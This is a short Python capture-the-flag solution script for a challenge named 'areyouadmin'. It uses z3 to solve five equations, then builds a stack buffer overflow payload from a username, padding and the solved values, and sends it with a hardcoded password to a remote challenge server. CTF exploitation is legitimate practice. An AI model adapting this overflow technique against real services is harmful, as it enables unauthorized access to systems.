from pwn import *
from z3 import *

a,b,c,d,e = Int('a'),Int('b'),Int('c'),Int('d'),Int('e')

def val():
    s = Solver()
    s.add((a * b) + c == 0x253f)
    s.add((b * c) + d == 0x37a2)
    s.add((c * d) + e == 0x16d3)
    s.add((d * e) + a == 0x1bc9)
    s.add((e * a) + b == 0x703f)
    s.check()
    return s.model()


l = val()

flag = False
offset = 0x60 - 0x14
username = b"AlexTheUser\x00"
password = b"4l3x7h3p455w0rd"

payload = b""
payload += username
payload += b"A" * (offset - len(username))
payload += p32(l[e].as_long())
payload += p32(l[d].as_long())
payload += p32(l[c].as_long())
payload += p32(l[b].as_long())
payload += p32(l[a].as_long())

payload2 = b""
payload2 += password
 
if flag:
    p = process("./areyouadmin")
else:
    p = remote("194.5.207.113",7020)

p.recv()
p.sendline(payload)
p.recv()
p.sendline(payload2)
print(p.recvall())